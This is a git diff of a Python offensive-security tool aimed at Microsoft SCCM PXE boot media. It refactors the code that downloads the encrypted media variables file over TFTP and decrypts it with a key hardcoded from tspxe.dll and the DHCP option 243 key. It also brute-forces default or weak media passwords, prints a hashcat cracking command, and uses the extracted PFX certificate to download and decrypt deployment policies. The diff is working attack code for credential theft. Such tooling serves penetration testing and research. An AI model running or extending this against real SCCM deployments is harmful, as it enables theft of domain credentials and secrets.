@@ -119,30 +119,48 @@ def CryptDecryptMessage(pfx, data):
     ciphertext = digested_data['encrypted_content_info']['encrypted_content'].native
     decrypted_data = b""
     enc_algo = digested_data['encrypted_content_info']['content_encryption_algorithm']['algorithm'].native
+
     if enc_algo == 'tripledes_3key':
-        #algo = digested_data['encrypted_content_info']['content_encryption_algorithm']['algorithm'].native
-        #print(f"{algo} not implemented yet")
-        decrypted_data = media_crypto._3des_decrypt_raw(ciphertext, key, iv)
+        algo = 'CALG_3DES'
     elif enc_algo == 'aes256_cbc':
-        decrypted_data = media_crypto.aes256_decrypt_raw(ciphertext, key, iv)
+        algo = 'CALG_AES_256'
     else:
         print(f"{enc_algo} not implemented yet")
+        return None
+
+    decrypted_data = media_crypto.decrypt_file(algo, ciphertext, key, iv, decode=False)
+
     return decrypted_data
 
 def decrypt_file(path, password):
+    # Uses the decryption class from media_decryption to decrypt a file
+    """ 
     # Decrypt encryted file type using the password provided
     # password must be already encoded to utf-16-le
     global PASSWORD
+    # read_media_variable_file reads out the raw file, skips the first 24 bytes, then skips the last 8 bytes
     encrypted_file = media_crypto.read_media_variable_file(path)
     try:
+        # Derive the key from the password
         key = media_crypto.aes_des_key_derivation(password)
-        last_16 = math.floor(len(encrypted_file)/16)*16
-        decrypted_file = media_crypto.aes128_decrypt(encrypted_file[:last_16],key[:16])
+        
+        last_16 = math.floor(len(encrypted_file)/16) * 16
+        
+        # For future Adam, Key Lens are defined by Microsoft here: https://learn.microsoft.com/en-us/windows/win32/seccrypto/aes-provider-algorithms
+        # This current implementation only supports AES-128, so we use the first 16 bytes of the derived key 
+
+        decrypted_file = media_crypto.aes128_decrypt(encrypted_file[:last_16], key[:16])
+
         decrypted_file =  decrypted_file[:decrypted_file.rfind('\x00')]
+        
         wf_decrypted_ts = "".join(c for c in decrypted_file if c.isprintable())
+
         return True, wf_decrypted_ts
     except:
         return False, None
+    """
+    media_decryption = media_crypto.media_decryption(path)
+    return media_decryption.decrypt_media_file(password)
 
 def decrypt_media_file(path, password):
     # print(f"{password} {path}")
@@ -203,9 +221,14 @@ def deobfuscate_credential_string(credential_string):
     key_data = binascii.unhexlify(credential_string[8:88])
     encrypted_data = binascii.unhexlify(credential_string[128:])
 
-    key = media_crypto.aes_des_key_derivation(key_data)
-    last_16 = math.floor(len(encrypted_data)/8)*8
-    return media_crypto._3des_decrypt(encrypted_data[:last_16],key[:24])
+    media_decryption = media_crypto.media_decryption(media_data=encrypted_data)
+    # I am unsure why this is hardset to 3DES, but I am just keeping it as that for now
+    media_decryption.set_encryption_type('CALG_3DES')
+    return media_decryption.decrypt_media_file(key_data)
+
+    #key = media_crypto.aes_des_key_derivation(key_data)
+    #last_16 = math.floor(len(encrypted_data)/8)*8
+    #return media_crypto._3des_decrypt(encrypted_data[:last_16],key[:24])
 
 def decrypt_pxe_media_from_encrypted_key(encrypted_key, media_file_path):
     #ProxyDHCP Option 243
@@ -220,13 +243,16 @@ def decrypt_pxe_media_from_encrypted_key(encrypted_key, media_file_path):
     # Harcoded in tspxe.dll
     key_data = b'\x9F\x67\x9C\x9B\x37\x3A\x1F\x48\x82\x4F\x37\x87\x33\xDE\x24\xE9' 
 
-    # Derive key to decrypt key bytes in the DHCP response
-    key = media_crypto.aes_des_key_derivation(key_data) 
+    media_decryption = media_crypto.media_decryption(media_data=encrypted_bytes)
+    media_decryption.set_encryption_type('CALG_AES_128')
+    var_file_key = media_decryption.decrypt_media_file(key_data, decode=False)
+    # 10 byte output
+    var_file_key = var_file_key[:10]
 
     # 10 byte output, can be padded (appended) with 0s to get to 16 struct.unpack('10c',var_file_key)
-    var_file_key = (media_crypto.aes128_decrypt_raw(encrypted_bytes[:16],key[:16])[:10]) 
+    #var_file_key = (media_crypto.aes128_decrypt_raw(encrypted_bytes[:16],key[:16])[:10]) 
 
-    # Perform bit extension to help with key 
+    # Perform bit extension to help with key
     LEADING_BIT_MASK =  b'\x80'
     new_key = bytearray()
     for byte in struct.unpack('10c',var_file_key):
@@ -234,7 +260,7 @@ def decrypt_pxe_media_from_encrypted_key(encrypted_key, media_file_path):
             new_key = new_key + byte + b'\xFF'
         else:
             new_key = new_key + byte + b'\x00'
-
+    
     media_variables = decrypt_media_file(media_file_path, new_key)
     return media_variables
 
@@ -480,8 +506,10 @@ def validate_ip_or_resolve_hostname(input):
 
 def generate_hashcat_output(input):
     hash = media_crypto.read_media_variable_file_header(input)
+
     print_nice(f"[yellow]Hash[white]: {hash}")
     print_nice(f"[yellow]Hashcat mode[white]: 19850 (requires https://github.com/The-Viper-One/hashcat-6.2.6-SCCM)")
+    # Note for future self: the current hashcat mode only supports AES-128...
     print_nice(f"[yellow]Command[white]: \nhashcat -m 19850 -a 0 '{hash}' '..\\rockyou(1).txt'")
 
 def test_default_weak_passwords_on_media(path):
@@ -1149,7 +1177,7 @@ def parse_media_files(password:str = None, variables_file:str = None, policy_fil
             variables_file = copy_file_to_dir(variables_file, f"{WORKING_DIR}/original_files/", delete_original=True)
             write_to_file(WORKING_DIR, "variables_decrypted", media_variables)
 
-            # Code Escape if Standalone Media Type is identified            
+            # Code Escape if Standalone Media Type is identified
             if (STANDALONE_MEDIA == "true" and policy_file is None):
                 print_nice("Stand-alone media detected. Please supply Policy file.")
                 return [None, None]
@@ -1371,7 +1399,7 @@ def get_variable_file_path(tftp_server):
             elif packet_type == 2:
                 # Skip first two bytes of option and copy the encrypted data by data_length
                 encrypted_key = variables_file[2:2+data_length]
-                
+
                 # Get the index of data_length of the variables file name string in the option, and index of where the string begins
                 string_length_index = 2 + data_length + 1
                 beginning_of_string_index = 2 + data_length + 2
@@ -1444,20 +1472,23 @@ def get_pxe_files(ip):
     tftp_client.download(bcd_file, WORKING_DIR + bcd_filename)
 
     if BLANK_PASSWORDS_FOUND:
+        # If a Blank Password is found for the media
         print_nice("Attempting automatic exploitation.", "INFO")
         decrypted_media_variables = decrypt_pxe_media_from_encrypted_key(encrypted_key, WORKING_DIR + variables_filename)
-        if decrypted_media_variables is not None:
-            print_nice("Writing media variables to variables.xml", "INFO")
-            write_to_file(WORKING_DIR, "variables", decrypted_media_variables)
-            smsMediaGuid, smsTSMediaPFX = extract_key_information_from_variables(decrypted_media_variables)
-            download_and_decrypt_policies_using_certificate(smsMediaGuid, smsTSMediaPFX) 
-        else:
-            print_nice("Failed to decrypt media variable file using the key retrieved from DHCP option 243", "ERROR")
     else:
-        # Lol, print this why not?
+        # If a defined password is used for the media
         print_nice("User configured password detected for task sequence media.", "INFO")
-        generate_hashcat_output(WORKING_DIR + variables_filename)
-    
+        response, decrypted_media_variables, resolved_password = test_default_weak_passwords_on_media(variables_file)
+
+    if decrypted_media_variables is not None:
+        #print_nice("Successfully decrypted media variables file using default/weak password!", "SUCCESS")
+        print_nice("Writing media variables to variables.xml", "INFO")
+        write_to_file(WORKING_DIR, "variables", decrypted_media_variables)
+        smsMediaGuid, smsTSMediaPFX = extract_key_information_from_variables(decrypted_media_variables)
+        download_and_decrypt_policies_using_certificate(smsMediaGuid, smsTSMediaPFX) 
+    else:
+        print_nice("Failed to decrypt media variable file", "ERROR")
+
     return True
 
 def download_and_decrypt_policies_using_certificate(guid, cert_bytes):
